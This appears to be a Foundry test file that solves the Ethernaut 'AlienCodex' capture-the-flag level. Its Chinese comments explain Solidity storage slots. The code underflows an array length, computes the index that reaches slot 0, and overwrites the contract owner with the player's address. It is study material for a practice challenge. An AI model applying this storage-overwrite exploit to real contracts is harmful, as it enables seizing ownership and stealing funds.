// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

/*
一份合约有2^256个slot，每个slot 32bytes

slot分布
https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018

有继承关系时
https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there
从上到下，从左到右依次分配slot

解题思路：
codex的length--，使length == 2^256 - 1
此时codex覆盖了合约所有slot，因此可以用codex获取到合约任意slot的内容
owner位于slot0, 因此只需要计算出slot0在codex的index即可
*/

contract AlienCodexTest is Test {
    // 只能通过address.call的方式来调用AlienCodex合约
    address public alien = 0x17D77997bb8a07C68574a158922918CC8FC00171;

    function getSlotForArrayElement(uint256 _elementIndex, uint256 _arraySlot) public pure returns (uint256) {
        bytes32 startingSlotForArrayElements = keccak256(abi.encode(_arraySlot));
        return uint256(startingSlotForArrayElements) + _elementIndex;
    }

    function testAlienCodex() public {
        (bool result, bytes memory data) = alien.call(abi.encodeWithSignature("owner()"));
        console.logBytes(data);

        (result, ) = alien.call(abi.encodeWithSignature("makeContact()"));
        (result, ) = alien.call(abi.encodeWithSignature("retract()"));

        uint256 slot0Index = type(uint256).max - getSlotForArrayElement(0, 1) + 1;

        (result, data) = alien.call(abi.encodeWithSignature("codex(uint256)", slot0Index));
        console.logBytes(data);  // 0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11

//        address player = 0xaCab087f7f0977c31d68E8BAe117069a90Dc6574;

        bytes32 content = bytes32(uint256(0x0000000000000000000000010aCab087f7f0977c31d68E8BAe117069a90Dc6574));
        (result, ) = alien.call(abi.encodeWithSignature("revise(uint256,bytes32)", slot0Index, content));

        (result, data) = alien.call(abi.encodeWithSignature("owner()"));
        console.logBytes(data);
    }
}